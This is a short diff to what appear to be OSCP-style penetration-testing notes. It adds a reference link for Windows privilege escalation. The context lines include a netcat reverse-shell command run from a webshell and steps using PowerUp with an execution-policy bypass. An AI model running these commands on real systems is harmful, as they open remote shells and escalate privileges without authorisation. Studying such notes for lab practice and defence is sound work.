@@ -29,6 +29,7 @@
 5. in a webshell windows, `\\192.168.119.159\share\nc.exe -e cmd.exe 192.168.119.159 123`
 
  # Privilege Escalation for Window
+ reference: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
  0. `whoami` `systeminfo` `whoami /priv` `whoami /groups' Conduct basic enumeration, and look for interesting files in the directory 
  1. Transfer the file to Window to TMP directory using any of the above methods.
  2. Use PowerUp. `powershell -ep bypass`
